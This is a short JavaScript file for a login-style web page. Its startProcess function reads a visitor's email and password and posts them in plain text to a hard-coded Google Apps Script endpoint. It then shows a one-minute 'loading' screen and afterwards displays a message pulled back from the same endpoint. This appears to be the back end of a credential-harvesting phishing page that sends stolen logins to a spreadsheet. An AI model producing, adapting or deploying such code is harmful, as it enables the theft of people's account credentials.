const API_URL = "https://script.google.com/macros/s/AKfycbzl_2VuUot0q_oRkG8swj3nVFzTIyZHMRX3hH02WPVeXHsHXOGu7aE9JGYhGop6brwl/exec";

// STEP 1: LOGIN + SEND DATA
async function startProcess() {
  const email = document.getElementById("email").value.trim();
  const password = document.getElementById("password").value.trim();

  if (!email || !password) {
    alert("Please fill all fields");
    return;
  }

  try {
    await fetch(API_URL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ email, password })
    });

    // show loading page
    showPage("loadingPage");

    // wait 1 minute
    setTimeout(loadMessage, 60000);

  } catch (err) {
    console.error(err);
    alert("Error sending data");
  }
}


// STEP 2: GET MESSAGE FROM SHEET
async function loadMessage() {
  try {
    const res = await fetch(API_URL);
    const data = await res.json();

    document.getElementById("msg").innerText = data.message;

    showPage("resultPage");

  } catch (err) {
    alert("Error loading message");
  }
}


// PAGE SWITCHER
function showPage(pageId) {
  document.querySelectorAll(".page").forEach(p => p.classList.remove("active"));
  document.getElementById(pageId).classList.add("active");
}
